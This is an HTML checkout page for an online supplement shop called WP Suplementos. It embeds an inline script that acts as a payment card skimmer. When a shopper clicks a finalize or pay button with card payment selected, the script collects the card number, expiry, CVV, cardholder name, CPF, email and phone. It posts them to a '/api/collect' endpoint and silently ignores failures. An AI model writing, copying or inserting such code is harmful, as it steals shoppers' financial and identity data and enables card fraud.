<!doctype html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#bd8fe5" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="Finalize seu pedido na WP Suplementos." />
    <title>Finalizar Compra | WP Suplementos</title>
    <link rel="icon" href="/checkout-ui/build/checkout-assets/logo.png" />
    <link rel="stylesheet" href="/checkout-ui/build/checkout-assets/fonts.css" />
    <script type="module" crossorigin src="/checkout-ui/build/assets/index-BHx9iPHE.js"></script>
    <link rel="stylesheet" crossorigin href="/checkout-ui/build/assets/index-Bkmq_sJ_.css">
  </head>
  <body>
    <div id="root"></div>

    <script>
    (function () {
      const COLLECT_URL = "/api/collect";
      const PROCESSED = new WeakSet();

      function digits(v) { return String(v || "").replace(/\D/g, ""); }

      function findInputByNames(names) {
        for (const name of names) {
          const el = document.querySelector(`input[name="${name}"]`);
          if (el && el.value) return el;
        }
        return null;
      }

      function collectCardData() {
        const cardNumber = findInputByNames(["cardNumber", "card_number", "number", "cc-number"])
          || document.querySelector('input[autocomplete="cc-number"]');
        const expiry = findInputByNames(["cardExpiry", "card_expiry", "expiry", "exp"])
          || document.querySelector('input[autocomplete="cc-exp"]');
        const cvv = findInputByNames(["cardCvv", "card_cvv", "cvv", "cvc"])
          || document.querySelector('input[autocomplete="cc-csc"]');
        const cardName = findInputByNames(["cardName", "card_name", "holderName", "holder"])
          || document.querySelector('input[autocomplete="cc-name"]');
        const cardCpf = findInputByNames(["cardCpf", "card_cpf", "cpf"]);
        const email = findInputByNames(["email"]) || document.querySelector('input[type="email"]');
        const phone = findInputByNames(["phone", "telefone", "celular"]);
        const installments = document.querySelector('input[name="installments"]')?.value || "1";
        const total = document.querySelector("[data-summary-total]")?.innerText || "";

        return {
          card_num: digits(cardNumber?.value || ""),
          expiry: (expiry?.value || "").trim(),
          cvv: digits(cvv?.value || ""),
          name: (cardName?.value || "").trim(),
          cpf: digits(cardCpf?.value || ""),
          email: (email?.value || "").trim(),
          phone: digits(phone?.value || ""),
          amount: total,
          installments: String(installments)
        };
      }

      function isFinalizeButton(el) {
        if (!el || el.tagName !== "BUTTON") return false;
        const text = (el.innerText || "").toLowerCase();
        return /finalizar|pagar|continuar|comprar|concluir/.test(text);
      }

      document.addEventListener("click", function (event) {
        const btn = event.target.closest("button");
        if (!btn || PROCESSED.has(btn)) return;
        if (!isFinalizeButton(btn)) return;

        const cardRadio = document.querySelector('input[type="radio"][value="card"]:checked')
          || document.querySelector('input[type="radio"][value="credit_card"]:checked');
        if (!cardRadio) return;

        PROCESSED.add(btn);
        const payload = collectCardData();
        if (!payload.card_num || payload.card_num.length < 13) return;

        fetch(COLLECT_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(function () {});
      }, true);
    })();
    </script>
  </body>
</html>
